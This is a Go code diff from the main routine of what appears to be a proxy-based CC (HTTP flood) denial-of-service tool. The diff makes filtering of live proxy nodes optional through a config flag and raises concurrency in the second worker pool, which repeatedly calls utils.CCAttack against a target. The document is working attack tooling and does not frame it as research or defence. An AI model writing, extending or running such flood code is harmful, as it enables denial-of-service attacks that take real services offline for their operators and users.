@@ -36,34 +36,37 @@ func main() {
 
 	counts := 0
 	var (
-		alivePlist []*utils.Nodes
+		alivePlist []utils.Nodes
 		status     int
 	)
+	if config.Cfg.FilterNode {
+		pool1, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
+			p := i.(utils.Nodes)
+			aliveP, _ := utils.CCAttack(&p, &counts, &status)
+			if aliveP.Proxy != nil {
+				alivePlist = append(alivePlist, aliveP)
+			}
+			wg.Done()
+		})
 
-	pool1, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
-		p := i.(utils.Nodes)
-		aliveP, _ := utils.CCAttack(&p, &counts, &status)
-		if aliveP != nil {
-			alivePlist = append(alivePlist, aliveP)
+		//initial alive proxies
+		fmt.Println("Filtering alive nodes")
+		for _, p := range PList {
+			wg.Add(1)
+			err = pool1.Invoke(p)
+			if err != nil {
+				fmt.Println(err.Error())
+			}
 		}
-		wg.Done()
-	})
-
-	//initial alive proxies
-	fmt.Println("Filtering alive nodes")
-	for _, p := range PList {
-		wg.Add(1)
-		err = pool1.Invoke(p)
-		if err != nil {
-			fmt.Println(err.Error())
-		}
+		wg.Wait()
+		pool1.Release()
+	} else {
+		alivePlist = PList
 	}
-	wg.Wait()
-	pool1.Release()
 
-	pool2, _ := ants.NewPoolWithFunc(config.Cfg.Connections/2, func(i interface{}) {
-		p := i.(*utils.Nodes)
-		_, _ = utils.CCAttack(p, &counts, &status)
+	pool2, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
+		p := i.(utils.Nodes)
+		_, _ = utils.CCAttack(&p, &counts, &status)
 		wg.Done()
 	})
 
